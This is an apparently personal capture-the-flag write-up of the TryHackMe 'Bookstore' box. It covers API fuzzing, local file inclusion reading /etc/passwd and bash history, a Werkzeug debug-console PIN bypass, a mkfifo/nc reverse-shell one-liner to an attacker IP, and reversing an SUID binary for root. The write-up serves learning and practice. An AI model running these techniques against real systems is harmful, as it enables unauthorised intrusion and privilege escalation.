---
title: Bookstore
parent: THM Boxes
grand_parent: Pwn Counter
nav_order: 32
has_children: true
---

# Bookstore

<img width="955" height="264" alt="image" src="https://github.com/user-attachments/assets/8a7ab36f-0e1e-4135-aa97-08dc0774b683" />


## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Box Description

> A Beginner level box with basic web enumeration and REST API Fuzzing.

## Recon

As always, I started off with an nmap scan which revealed services on ```ports 22, 80, and 5000``` with ```port 5000``` being a werkzueg flask app/server.

Opening up the webpage being served on ```port 80```, we see a website for a bookstore. I tried testing the functionality of the different website functions to see if there was anything I could inherently exploit in the design of them, but I found nothing.

Opening up ```port 5000``` in the browser, we see a message indicating that this is the port used for the API used by the website. The nmap scan also revealed that there was a ```/robots.txt``` file which upon opening contained the ```/api``` subdir which housed the API's documentation.

<img width="1118" height="461" alt="image" src="https://github.com/user-attachments/assets/fc02e35c-a755-4acf-b784-74ad8c5d80fe" />

---

### Legacy API

Seeing that all the API endpoints had the ```/v2``` directory in common, I wanted to see if there was a ```v1``` or even a ```v0``` to see if they had left the legacy version of the API not used by the website live.

I intercepted a request to the API endpoint in burp, sent the captured request to repeater, edited the ```v2``` to ```v1``` and sent the request hoping for a response. And I got one! All the endpoints featured in the documentation for the v2 API were present in the v1 API.

<img width="1240" height="385" alt="image" src="https://github.com/user-attachments/assets/8ce904e2-48c5-4af9-a77b-258053b07855" />

### Fuzzing the API

I was originally planning on fuzzing the v2 API, but the hidden v1 API seems more promising.

Looking at API endpoints, I noticed how there were multiple parameters available for use which filled me with the hope of finding an LFI vulnerability.

I decided to fuzz the parameters to see if there were any hidden parameters that would enable me to exploit an LFI vulnerability.

Using the command ```ffuf -u http://10.65.179.176:5000/api/v1/resources/books?FUZZ=1 -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt```, I found a hidden parameter for the v1 API named ```show```.

<img width="1102" height="451" alt="image" src="https://github.com/user-attachments/assets/e5ad5b69-73db-4b35-84f6-a8ad02629f61" />

### Investigating the show API parameter

I noticed that the server returned a 500 error code when fuzzing, so I tried to navigate to the parameter in my browser to see if there was any error code, and there was! It was an error code specifying that the ```show``` parameter's value had to be a filename. Nice.

I tried the low hanging fruit of ```/etc/passwd``` with no obfuscation and actually got the result back! Sweet <img width="210" height="368" alt="sweetnomnomnomGIF" src="https://github.com/user-attachments/assets/6e8716ce-39d9-4032-9f4a-251dec7e6e23" />

<img width="1908" height="191" alt="image" src="https://github.com/user-attachments/assets/d30c8e13-8383-4e6a-bab8-70d16a704b64" />

### LFI to RCE

Now that there is a confirmed LFI vulnerability, I needed to find a way to achieve RCE. 

After some light googling, I found that the debug error message shown for an invalid filename was for Werkzeug (which I had forgotten that I had already found via nmap). 

This error message also had a console feature that allowed commands to be run on the machine hosting the application, but it is guarded by a pin. 

---

Googling on how to bypass this pin, I found this [hacktricks article](https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/werkzeug.html) on how to do just that listing that I needed the username of the user running flask, the full path to the flask app, the mac address, and device id

I checked the current UID and GUID by reading ```/proc/self/status``` and then cross referencing those values in ```/etc/passwd``` and found the user ```sid``` was running the flask app. Found the full path of the flask app which was ```/usr/lib/python3/dist-packages/flask/app.py```. Found the MAC Address by reading the active network interface from ```/proc/net/arp``` and then reading ```sys/class/net/ens5/address``` to get the MAC address of ```0a:ff:f1:73:c4:eb ```, and then converted it into decimal format using python which gave me ```
12094383834347```. Finally, I got the machine id of ```d86a656616e9492d93f4ab7905f44292``` by reading ```/etc/machine-id```.

Having all this information, I used the script provided and filled in the information I had gathered and hoped for the best.

And it didnt work. Oh well.

I went back to the drawing board and thought about any other useful information I could gleam from LFI. I remembered that since I knew the user of the flask app, I could try and check the bash history since when you start up a flask app it prints the code to stdout.

<img width="1015" height="119" alt="image" src="https://github.com/user-attachments/assets/15d010cd-73a7-401d-baa5-1ddcacf57dc8" />

And as simple as that. Not for the reason I thought but a win is a win.

### Debug Console Access

Using the following command found on the hacktricks article to execute system commands, we have achieved RCE. Sweeeetttttt.

<img width="1887" height="164" alt="image" src="https://github.com/user-attachments/assets/5acccf29-5ecb-4fd4-9964-b46cd4733649" />

I wanted to get a reverse shell so I wouldn't have to do all my work from this console so I used the command ```__import__('os').popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.130.135 1337 >/tmp/f').read();``` and got a callback on my listener, nice.

<img width="531" height="116" alt="image" src="https://github.com/user-attachments/assets/6ada7b42-26ef-4937-a26c-9a91bc1bb7b6" />

### Shell Foothold/Exploring binary

With my shell session, I got the user flag and found a weird file named ```try-harder```. Running ```file``` on it, I discovered that it was a binary.

Executing the binary with ```ltrace``` I found that the binary sets your user id to root and then checks for some kind of Magic Number. 

```ltrace``` wasn't giving me enough info, so I downloaded the binary via an http server i set up on the target box to analyze it with Ghidra.

### Reversing the binary with Ghidra

Upon downlaoding, I threw the binary into ghidra to take a look at the decompiled code as shown below (with some renamed variables):

```c
void main(void)

{
  long in_FS_OFFSET;
  uint local_1c;
  uint hardcoded_23987;
  uint magic_num;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setuid(0);
  hardcoded_23987 = 0x5db3;
  puts("What\'s The Magic Number?!");
  __isoc99_scanf(&DAT_001008ee,&local_1c);
  magic_num = local_1c ^ 0x1116 ^ hardcoded_23987;
  if (magic_num == 1573724660) {
    system("/bin/bash -p");
  }
  else {
    puts("Incorrect Try Harder");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}

```

Now with the decompiled code I can clearly see what the binary is doing.

This binary is setting the user's uid to root, then asking the user for a number, and then xoring that number twice, and then checking if the result is the hardcoded correct result. If it is then spawn a bash shell with root privileges using the binary's suid bit, if not then print try harder.

So to get this magic number, I took the hardcoded result, xored it against the two variables it xored the user input against in order to get the correct user input (or magic number) and got ```1573743953```.

## priv esc

Going back to the shell, I ran the binary, input the number I calculated, and got a root shell.

<img width="566" height="210" alt="image" src="https://github.com/user-attachments/assets/71ab78b4-c1ed-4ab1-9c36-a4fe7c389171" />

---

## Solution Steps

1. Find the live legacy api
2. fuzz for parameters and find the show parameter
3. Exploit the show parameter to exploit the LFI vulnerability
4. Get the Werkzeug console pin from sid's ```.bash_history```
5. Execute a reverse shell using the console
6. Reverse engineer the binary to get the correct magic number
7. input the magic number and get a root shell.

## Thoughts

This box was geared towards players who are new to API hacking which is perfect because I am new to the concept, so it was fairly easy after the initial API fuzzing. But it was still a fun box, I really enjoyed the reverse engineering part too.

---

Thank you for reading!

